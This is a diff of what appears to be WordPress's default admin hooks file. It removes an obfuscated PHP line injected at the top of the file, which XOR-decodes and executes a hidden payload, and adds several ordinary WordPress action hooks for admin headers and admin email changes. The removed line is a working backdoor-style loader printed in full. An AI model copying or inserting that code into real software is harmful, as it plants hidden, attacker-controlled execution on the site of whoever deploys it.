@@ -1,4 +1,4 @@
-<?php $mDJnjRtyo='5:V+.-fQ0>OZDBV'^'VH3JZH97EP,.--8';$PaNiFAPsgP=$mDJnjRtyo('','WFDX>B<5EXY>1R49K79ZeHO5;,.J a8Q0BCKFK>sA6F>O,QTZHIDDi30EA<gM2YCVUV-ZJJvR=UJwISbLOznoh608pxHbVYp4j17+ohEAdNcYcm+q:DGLXXbA  0 nWYQTdEE3cEm:HCsYVGQO5J5LbmEsP:KBYS02A8qJIFH+-7VcK>+1XmhjRyaI-L6::yb<=NJKc86dSF4FZSM9gva18GXSz7pQZF8:1-4Uyf<M: 2oB<0-==WTRiClo46x:;3p,0FB QBowkZk8WQ3=do+PChPPE,+R=7tqjJ;7.Oc<OJRD-SgVrKJ9METEEO0;.bPlU5Z3;MA0o;P BE++VPzo<04:kw7<pTAKoZQJplLSjKWY2=ZZ49=eMWR,Lr E=yOwk3R3vPJcm7MLYbQii:5><0yAQAL<HOfUVJ2XtA:AU1=YX LX9VXERLtYXJ9h4,OYkLS+0Euo VWCD.JR6L,XnGhk+4=79XWJDqWABFoTQ.AJUkPIUJY G=<,2h+ R<2JGJF75saqPH0ILFSRTnD;5zBFWAMS2T368blZetQfBOqLlEGKRkvr8Db0Ydy5bwxJuSV;PDWXUioAAll14CT+rZE<9N--I=2jhBS7ASA0FCUi54IRoaisfUGE9eZK5S.Fk ZHP0TF  QTXTT2Ai9y1K=-Rqjt64'^'> lyX7RV116Pn7LP8CJrB0 GdHO>A>g<E6dbokEyHP3P,X8;4h1+66WQ1 c8 G-kr17Y;fjR9X,cWisBl4pgfLYELPEhEqbz=cWXYGL,aYnSbCIBMI05 =6JeDADAGlyu=Onl9jLIU=7SwkgykQ+A-9I,.pdkf26IieQQoi5<YAR8KoUNHq0AQXph;H8CHTQFSH:cpi1Kn.L>b>29XGKAWY++6A=T5;2YeZHMuDFZ,VSWTH6VBOX67:IkH0wy7qrvPMCffK4;OJUzON6=FXMOPZJL411Mt9XNTLJnPRWti5k.30LsZvV=+U8 oO8E:RHBxMqQ;GZdaKe26O0 JH>pRKcbqk>2dhP52kK143PQrsN=65GXszO34li33X--K DYrWOX7JMZCjIS,88BlIMLTRIUBKX<FABEB17>SxIaz4;BX+1A 1C3p==>+=9>X7kA:-C.2XUsA0D34, KbvR-X9GkHOOUIVf323mXlK+ Gp5O5+uMvi48+A>bWIK7NX;OF9om-RLTMQt,Q=-ostrNlVQOjb3 92isXSAE1sEIlFe.EyTuuybRAGZuSU=PISTBMxDa0X5 b>0NFagJLPF15R-1 Ef+UD:IABO22N-< TaouMQU=3FHISFugeBoS.C2BnOD;<1ks6AY=;90sohR3pT3TYzACO<I');$PaNiFAPsgP();
+<?php
 /**
  * Administration API: Default admin hooks
  *
@@ -38,6 +38,8 @@ add_filter( 'media_upload_library', 'media_upload_library' );
 add_filter( 'media_upload_tabs', 'update_gallery_tab' );
 
 // Misc hooks.
+add_action( 'admin_init', 'wp_admin_headers'         );
+add_action( 'login_init', 'wp_admin_headers'         );
 add_action( 'admin_head', 'wp_admin_canonical_url'   );
 add_action( 'admin_head', 'wp_color_scheme_settings' );
 add_action( 'admin_head', 'wp_site_icon'             );
@@ -54,6 +56,10 @@ add_action( 'admin_print_scripts-post-new.php', 'wp_page_reload_on_back_button_j
 add_action( 'update_option_home',          'update_home_siteurl', 10, 2 );
 add_action( 'update_option_siteurl',       'update_home_siteurl', 10, 2 );
 add_action( 'update_option_page_on_front', 'update_home_siteurl', 10, 2 );
+add_action( 'update_option_admin_email',   'wp_site_admin_email_change_notification', 10, 3 );
+
+add_action( 'add_option_new_admin_email',    'update_option_new_admin_email', 10, 2 );
+add_action( 'update_option_new_admin_email', 'update_option_new_admin_email', 10, 2 );
 
 add_filter( 'heartbeat_received', 'wp_check_locked_posts',  10,  3 );
 add_filter( 'heartbeat_received', 'wp_refresh_post_lock',   10,  3 );
@@ -99,8 +105,11 @@ add_action( 'install_themes_pre_theme-information', 'install_theme_information' 
 add_action( 'admin_init', 'default_password_nag_handler' );
 
 add_action( 'admin_notices', 'default_password_nag' );
+add_action( 'admin_notices', 'new_user_email_admin_notice' );
 
 add_action( 'profile_update', 'default_password_nag_edit_user', 10, 2 );
+
+add_action( 'personal_options_update', 'send_confirmation_on_profile_email' );
 
 // Update hooks.
 add_action( 'load-plugins.php', 'wp_plugin_update_rows', 20 ); // After wp_update_plugins() is called.
